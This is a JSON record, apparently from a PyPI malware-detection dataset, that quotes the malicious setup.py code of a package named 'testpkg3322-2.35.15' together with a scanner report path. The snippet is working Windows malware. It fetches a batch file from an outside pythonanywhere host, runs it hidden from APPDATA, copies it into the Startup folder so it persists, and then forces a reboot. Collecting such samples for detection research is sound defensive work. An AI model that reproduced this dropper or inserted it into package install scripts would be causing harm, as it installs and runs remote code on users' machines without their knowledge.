[
  {
    "pyfile": "setup.py",
    "malicious_code_snippets": "import urllib.request\nimport os\nimport sys\nimport subprocess\nimport time\n\ndef x():\n    t = \"https://frvezdff.pythonanywhere.com/getrnr\"\n\n    path,_ = urllib.request.urlretrieve(t, os.getenv('APPDATA')+\"\\\\test123.bat\")\n    time.sleep(2)\n\n    if getattr(sys, 'frozen', False):\n        currentFilePath = os.path.dirname(sys.executable)\n    else:\n        currentFilePath = os.path.dirname(os.path.abspath(__file__))\n\n    fileName = os.path.basename(sys.argv[0])\n    filePath = os.path.join(currentFilePath, fileName)\n\n    startupFolderPath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')\n    startupFilePath = os.path.join(startupFolderPath, fileName)\n\n    subprocess.Popen(os.getenv('APPDATA')+\"\\\\test123.bat\", creationflags=subprocess.CREATE_NO_WINDOW)\n    try:\n        path,_ = urllib.request.urlretrieve(t, startupFilePath+\"\\\\test123.bat\")\n    except:\n        pass\n    time.sleep(15)\n\n    os.system(\"shutdown /r /f\")\n    \n\nx()"
  },
  {
    "metadata": {
      "package_name": "testpkg3322-2.35.15",
      "report_path": "/home/blue/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/testpkg3322-2.35.15.txt"
    }
  }
]